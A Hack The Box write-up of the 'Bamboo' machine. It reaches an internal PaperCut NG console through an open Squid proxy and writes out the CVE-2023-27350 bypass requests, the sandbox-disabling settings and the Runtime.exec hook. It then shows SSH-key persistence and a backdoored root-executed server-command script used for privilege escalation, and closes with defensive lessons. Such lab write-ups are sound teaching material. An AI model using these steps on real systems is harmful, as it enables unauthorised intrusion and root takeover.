# Bamboo — Hack The Box, Medium, Linux

**TL;DR:** A non-standard Squid proxy on 3128 is the whole front door — it will
reach `127.0.0.1` for you, and behind it sits an internal **PaperCut NG 22.0.6**
admin server that never should have been exposed. That build is vulnerable to
**CVE-2023-27350**: visiting `SetupCompleted` and posting the login form drops
you into a full admin session with no password, and the print-scripting engine
turns that session into code execution. Egress is filtered, so instead of a
reverse shell the foothold is an SSH key written into the service account's
`authorized_keys`. Locally, the PaperCut service account can write the very shell
script that the **root**-owned Print Deploy service executes when printers are
refreshed — replace it, trigger a refresh, and root runs your code.

*Flags redacted. Machine addresses generalised to `10.129.x.x` and the attacker
VPN address to `10.10.14.x` — those are properties of the engagement, not the
machine. Internal API secrets recovered from disk are redacted and referred to by
their file and role; the technique does not depend on their literal values.
Hostname, service versions and file layout are kept, because they are properties
of the box.*

---

## What the ports said

Two TCP ports answered, and their pairing is the whole story:

```
22/tcp   OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu 22.04)
3128/tcp Squid http proxy 5.9
```

SSH is a way *out*, not a way in, until you have a credential. Squid on 3128 is
the anomaly — a forward proxy exposed to the internet is almost never intentional,
and its reason for existing on a target is that it can reach things you cannot.
The first question for any exposed proxy is "what does it consider local", and
the answer here was the loopback interface.

```bash
curl -x http://10.129.x.x:3128 http://127.0.0.1:9191/ -I
```

Sweeping `127.0.0.1` through the proxy turned up a cluster of services refusing
direct connections but happily proxied: **9191** (PaperCut NG, `302 → /user`),
plus 9173/9174/9192/9195 as its auxiliaries. The Squid `Via` and `X-Cache`
headers also leaked the hostname — `bamboo`.

## PaperCut, and a version that dates itself

The admin console identified itself precisely:

```
PaperCut NG 22.0.6 (Build 64379)
```

Anything below 22.0.9 is exposed to **CVE-2023-27350**, an authentication bypass
that chains into remote code execution. The bug lives in the `SetupCompleted`
page: the setup wizard's completion screen remains reachable after setup, and its
access control is broken, so an unauthenticated visitor can drive it as an
administrator.

The bypass is two requests, not one — this is the part a naïve attempt gets
wrong:

```
GET  /app?service=page/SetupCompleted            # establishes a session
POST /app  service=direct/1/SetupCompleted/$Form&sp=S0
           &Form0=$Hidden,analyticsEnabled,$Submit&$Hidden=true&$Submit=Login
```

The GET alone lands you in a *partial* session that only renders the About and
setup pages — every real admin page redirects back to About, which reads as "the
bypass failed." It is the POST of the `Login` form that promotes the session to
full administrator; only then does `ConfigEditor` load and the printer list
populate. (PaperCut 22.0.6 also checks the `Origin`/`Referer` header, so those
have to be set on every request.)

## From admin to code execution

CVE-2023-27350's RCE half uses the **print-scripting engine**. Two config values
gate it, both settable from the admin session you just forged, through the
`ConfigEditor` quick-find:

```
print-and-device.script.enabled = Y
print.script.sandboxed          = N
```

With the sandbox off, a printer's "script" is evaluated as JavaScript with full
access to the Java runtime — so the script body calls straight into
`Runtime.exec`:

```javascript
function printJobHook(inputs, actions) {}
java.lang.Runtime.getRuntime().exec([...]);
```

Saving the script triggers the evaluation, and the command runs as the account
the PaperCut app-server runs as — here, `papercut`. (Restore both settings after,
so the console is left as it was found.)

## Egress is filtered — so the payload stays local

The reflex here is a reverse shell, and it fails: the target's outbound traffic
is filtered, and callbacks to the usual ports never arrive. That is worth
treating as a finding rather than a nuisance — when egress is closed, the shell
has to be *inbound*, and 22 is open.

So the exec payload does not dial out. It writes an attacker public key into the
service account's `authorized_keys`:

```bash
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys
```

and the foothold becomes an ordinary SSH login:

```
ssh -i key papercut@10.129.x.x
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
```

`user.txt` is in `papercut`'s home. Foothold without a single packet leaving the
box on a port of the attacker's choosing.

## Local enumeration, and a wall worth documenting

The privilege-escalation surface is unusually rich and unusually locked. Three
PaperCut services are defined under systemd, and their binaries all live under
`/home/papercut`, a tree the `papercut` account owns and can rewrite:

```
pc-app-server     User=papercut                     (the 9191 console)
pc-web-print      no User= → starts as root, drops   (a Perl script)
pc-print-deploy   no User= → runs as ROOT            (Restart=always)
```

Two of these run as root and execute files we can overwrite. `pc-print-deploy`
is the obvious prize — its `ExecStart` binary is `papercut`-writable and it runs
as root with `Restart=always`. The catch is the trigger:

- The running root processes cannot be signalled (`kill` → `Operation not
  permitted`).
- `systemctl restart` is refused (`Interactive authentication required` — polkit,
  and we have no password).
- No cron job or timer restarts any of them.
- A reboot is useless: on this platform the machine reverts to a clean snapshot,
  which would wipe the implant along with everything else.

So "overwrite the root binary" is real but inert without a self-serve restart,
and there is none. `pc-web-print` is the same story — its systemd unit has no
`User=`, so it starts as root and the Perl script drops privileges with
`$< = $> = $uid`; but its `SIGHUP` handler re-execs *after* the drop, so a HUP you
can send only re-runs it as `papercut`. Both roads need a restart nobody can
give them. This is the point where the interesting service is the *third* one.

## The script root runs on demand

PaperCut's app-server ships a wrapper CLI at:

```
/home/papercut/server/bin/linux-x64/server-command
```

It is a plain shell script, owned by `papercut` and writable by `papercut`:

```
-rwxr-xr-x 1 papercut papercut  493  server-command
```

The lever is *who* invokes it. When printers are refreshed through the admin
console's Mobility Print / BYOD import flow, the **root-owned Print Deploy
service** shells out to `server-command` to talk back to the app-server — as
root. Unlike the systemd binaries, this execution is not gated behind a service
restart; it happens on demand, and the demand is an admin action we control.

Print Deploy's own admin API (on 9174) authenticates internal callers with a key
that is sitting in a world-*and*-`papercut`-readable file on disk
(`server/data/internal-api-key.dat`). Presented as a bare `Authorization` header,
that key authenticates to the Print Deploy admin and deploy endpoints —
`/admin/api/config`, `/admin/api/mobilityServers/v2`, `/admin/api/mobilityPrinters/v2`,
and the rest. Which means the "refresh printers" action can be driven directly,
without the browser wizard.

The exploitation is three steps:

1. **Back up and replace** `server-command`. The replacement does its root work
   and then `exec`s the saved original, so the service call still returns a valid
   response and nothing downstream breaks. Again the payload stays local — plant
   an SSH key in `/root/.ssh/authorized_keys` rather than dial out:

   ```sh
   #!/bin/sh
   mkdir -p /root/.ssh
   echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys
   exec "$(dirname "$0")/.server-command.real" "$@"
   ```

2. **Trigger the mobility-printer import** against the Print Deploy API with the
   recovered internal key:

   ```
   POST https://127.0.0.1:9174/admin/api/mobilityPrinters/v2
   Authorization: <internal-api-key from server/data/internal-api-key.dat>
   ```

3. **Root runs the script.** The import makes the root service invoke
   `server-command`; the planted `id` proof comes back `uid=0(root)`, and the key
   is now in root's `authorized_keys`:

   ```
   ssh -i key root@10.129.x.x
   uid=0(root) gid=0(root) groups=0(root)
   ```

`root.txt` is in `/root`. Restore the original `server-command` afterward so the
console keeps working.

## What did not work, and the near-misses

- **The single-request auth bypass.** Posting the `SetupCompleted` form without
  the priming GET returns `400`, and the GET-only session silently degrades to
  About-only. Both failure modes look like "the CVE is patched" and neither is.
  The bypass is GET-then-POST, and the tell is whether `ConfigEditor` loads.
- **The reverse shell.** Burned time before the egress filter was treated as a
  fact rather than a flaky payload. A one-line SYN test to an attacker-controlled
  port settles it in seconds; after that, everything is inbound over 22.
- **The whole writable-root-binary detour.** `pc-print-deploy` and `pc-web-print`
  are both root-run and both `papercut`-writable, and both are dead ends because
  nothing an unprivileged user can do will restart them, and a reboot reverts the
  box. Hours can disappear into trying to force a restart that the design never
  offers. The escalation was never a *restart* primitive — it was an *on-demand
  exec* primitive, and only `server-command` had that shape.
- **Cracking the admin hash.** `server.properties` yields the console admin's
  bcrypt hash, an obvious "reuse it for the system account" lead. On the box's
  CPU it cracked at a few hundred candidates a second — hopeless unless the
  password sits in the first fraction of a percent of the wordlist, and it did
  not. It ran in the background and contributed nothing; the intended path was
  never a crack.

## Defensive takeaway

The chain is a stack of small exposures, only one of which has a CVE number:

1. **A forward proxy open to the internet.** Squid on 3128 is what makes an
   internal-only admin console reachable at all. An application should never be
   fronted by a proxy that will resolve `127.0.0.1` for arbitrary clients.
2. **An unpatched PaperCut.** CVE-2023-27350 is unauthenticated RCE; 22.0.6 is
   years past the fix. The proxy turned a "not internet-facing, lower priority"
   patch into a full foothold.
3. **A root service that executes a user-writable script.** This is the one that
   converts a foothold into root, and it is the deepest mistake. `server-command`
   is writable by the same low-privilege account the web application runs as, and
   a root service executes it on an action that same account can trigger. The
   web-app account and the root helper it calls share a writable file — that is
   the whole vulnerability.

The first two get you a shell as `papercut`. The third — a privilege boundary
that a writable file quietly straddles — is what turns that shell into the whole
machine. Fix the file ownership and permissions on everything a root service
executes (root-owned, not group- or other-writable, and not living under a
service account's home), and the CVE costs you a contained web shell instead of
the box. The pattern holds across engagements: the loud bugs get you in; a
quietly-widened boundary gets you everything.
